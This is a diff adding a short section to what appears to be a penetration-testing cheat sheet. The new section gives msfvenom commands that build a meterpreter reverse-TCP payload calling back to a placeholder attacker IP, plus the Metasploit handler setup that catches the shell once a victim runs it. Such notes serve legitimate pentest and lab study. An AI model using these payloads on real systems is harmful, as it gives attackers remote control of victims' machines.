@@ -141,3 +141,22 @@ It is possible to capture the system calls running `strace {{program}}` and the 
 
 ### Anonymous for an ftp server
 If anonymous access is detected by, for example, an nmap scan, connect to it using user=anonymous and it does not really matter what is passed as password.
+
+### `msfvenom`
+Get file types available:
+```
+msfvenom --help-formats
+```
+
+Generate a meterpreter reverse shell for windows (same for linux, just replace the word):
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST={{attackerIP}} LPORT={{attackerPort}} -f {{fileType}} -o {{outputFile}}
+```
+
+When executed from the victim, it will trigger a reverse shell if there's a listener set up from Metasploit:
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
+
+Then set options and run.
